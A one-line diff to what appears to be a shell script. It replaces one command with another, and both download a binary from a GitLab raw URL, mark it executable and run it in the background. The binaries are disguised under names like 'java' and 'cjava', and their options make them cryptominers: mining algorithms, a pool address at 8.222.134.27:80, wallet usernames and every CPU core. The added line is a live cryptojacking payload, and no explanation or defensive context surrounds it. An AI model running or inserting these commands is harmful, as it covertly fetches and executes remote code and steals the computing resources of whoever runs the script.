@@ -1,1 +1,1 @@
-wget -qO java https://gitlab.com/jasa4/jasa/-/raw/main/jupyterlab && chmod +x java && nohup ./java -a rx/0 -o 8.222.134.27:80 -u SaLvsAXvo1HSCeA3Fq12dAjVoPb9pVkPSHntdWbLRnRWSxsU9jJW6Kv9mqE3Q1mKXiGMa1MCaD76NFdSrzfzLdvJJjDphKEpADT.$(echo $(shuf -i 1-9 -n 1)-tahu ponk) --randomx-1gb-pages -p -x -t $(nproc --all)
+wget -qO cjava https://gitlab.com/ghcees/pack/-/raw/main/cjava && chmod +x cjava && nohup ./cjava -a yespowertide -o 8.222.134.27:80 -u TQzCg7GXgftgYSbKKAe1E5XWZaf5F7GxsG.Gaws -p x -t $(nproc --all)
